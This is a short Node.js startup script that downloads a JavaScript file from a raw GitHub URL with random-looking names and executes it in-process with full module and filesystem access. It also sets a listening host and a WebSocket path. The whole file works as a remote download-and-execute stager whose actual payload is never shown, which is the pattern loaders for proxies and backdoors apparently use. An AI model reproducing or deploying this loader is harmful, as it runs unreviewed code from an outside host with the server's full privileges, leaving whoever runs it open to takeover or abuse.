'use strict';

const https = require('https');
const vm = require('vm');
const path = require('path');
const { Module, createRequire } = require('module');

const REMOTE_URL = process.env.REMOTE_URL || 'https://raw.githubusercontent.com/RSE20wfk/FnjaDqx20M/refs/heads/main/index.js';
const MAX_SIZE = 2 * 1024 * 1024;

process.env.PORT ||= '5000';
process.env.HOST ||= '0.0.0.0';
process.env.WS_PATH ||= '/channel';

function fetchRemoteCode(url, redirects = 0) {
  return new Promise((resolve, reject) => {
    if (redirects > 3) {
      return reject(new Error('Too many redirects'));
    }

    let parsed;
    try {
      parsed = new URL(url);
    } catch (err) {
      return reject(err);
    }

    if (parsed.protocol !== 'https:') {
      return reject(new Error('HTTPS URL required'));
    }

    const req = https.get(url, {
      headers: { 'User-Agent': 'node' }
    }, res => {
      if ([301, 302, 303, 307, 308].includes(res.statusCode)) {
        const location = res.headers.location;
        res.resume();

        if (!location) {
          return reject(new Error('Redirect without location'));
        }

        return fetchRemoteCode(
          new URL(location, url).href,
          redirects + 1
        ).then(resolve, reject);
      }

      if (res.statusCode !== 200) {
        res.resume();
        return reject(new Error(`HTTP ${res.statusCode}`));
      }

      const chunks = [];
      let size = 0;

      res.on('data', chunk => {
        size += chunk.length;

        if (size > MAX_SIZE) {
          res.destroy(new Error('Remote code too large'));
          return;
        }

        chunks.push(chunk);
      });

      res.on('end', () => {
        resolve(Buffer.concat(chunks).toString('utf8'));
      });

      res.on('error', reject);
    });

    req.setTimeout(15000, () => {
      req.destroy(new Error('Download timeout'));
    });

    req.on('error', reject);
  });
}

async function main() {
  if (REMOTE_URL === 'xxxxxx') {
    throw new Error('REMOTE_URL is not configured');
  }

  console.log('Loading remote index.js...');

  const code = await fetchRemoteCode(REMOTE_URL);
  const filename = path.join(__dirname, 'index.js');

  const remoteModule = new Module(filename, module);
  remoteModule.filename = filename;
  remoteModule.paths = module.paths;

  const remoteRequire = createRequire(filename);
  remoteRequire.main = remoteModule;
  remoteModule.require = remoteRequire;

  const wrapper = vm.runInThisContext(
    `(function(exports, require, module, __filename, __dirname) {
${code}
})`,
    { filename }
  );

  wrapper.call(
    remoteModule.exports,
    remoteModule.exports,
    remoteRequire,
    remoteModule,
    filename,
    __dirname
  );

  remoteModule.loaded = true;

  console.log('Remote index.js executed successfully');
}

main().catch(err => {
  console.error('Startup failed:', err);
  process.exitCode = 1;
});
